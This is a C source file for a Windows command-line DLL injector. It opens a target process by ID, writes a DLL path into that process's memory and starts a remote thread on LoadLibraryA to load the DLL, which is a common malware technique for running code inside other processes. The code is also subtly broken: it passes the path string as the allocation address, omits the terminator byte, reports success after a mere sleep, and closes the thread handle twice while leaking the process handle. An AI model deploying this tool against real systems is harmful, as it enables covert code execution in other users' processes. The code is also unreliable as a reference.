#include <Windows.h>
#include <stdio.h>

DWORD PID,TID;

int main(int argc, char* argv[]) {

	if (argc < 3) {
		
		printf("\n[!] usage: DLLInjector.exe <PID> <Full path to DLL>\n\n");
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);

	HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (hprocess == NULL) {

		printf("[!] Failed to open the handle to the process %ld\nExiting with error %ld", PID,GetLastError());
		return EXIT_FAILURE;
	}

	printf("[+] Got an handle to the process\n\t\\----0x%p\n", hprocess);

	LPVOID virtualmem = VirtualAllocEx(hprocess, argv[2], strlen(argv[2]), (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);

	if (virtualmem == NULL) {
		printf("[!] Failed to allocate memory. Exiting with error %ld\n", GetLastError());
		return EXIT_FAILURE;
	}

	printf("[+] Memory successfully allocated\n\t\\----0x%p\n", virtualmem);

	BOOL writemem = WriteProcessMemory(hprocess, virtualmem, argv[2], strlen(argv[2]), NULL);
	
	if (writemem == 0) {
		printf("[!] Failed to write the buffer into the allocated memory\nExiting with error %ld\n", GetLastError());
		return EXIT_FAILURE;
	}

	printf("[+] Successfully written the buffer into the memory\n");

	HANDLE hThread = CreateRemoteThread(hprocess, NULL, 0,
		(LPTHREAD_START_ROUTINE)GetProcAddress(
			GetModuleHandle(L"kernel32.dll"), "LoadLibraryA"),
		virtualmem, 0, &TID);

	if (hThread == NULL) {
		printf("[!] Failed to create a remote thread.\nExiting with error %ld\n", GetLastError());
		return EXIT_FAILURE;
	}

	printf("[+] Successfully created remote thread\n\t\\----0x%p\n", hThread);
	printf("[+] Attempting to execute the thread\n");
	Sleep(240);
	printf("[+] Thread successfully executed\n");

	WaitForSingleObject(hThread, INFINITE);

	printf("[+] Cleaing up...\n");
	CloseHandle(hThread);
	CloseHandle(hThread);

	return EXIT_SUCCESS;
}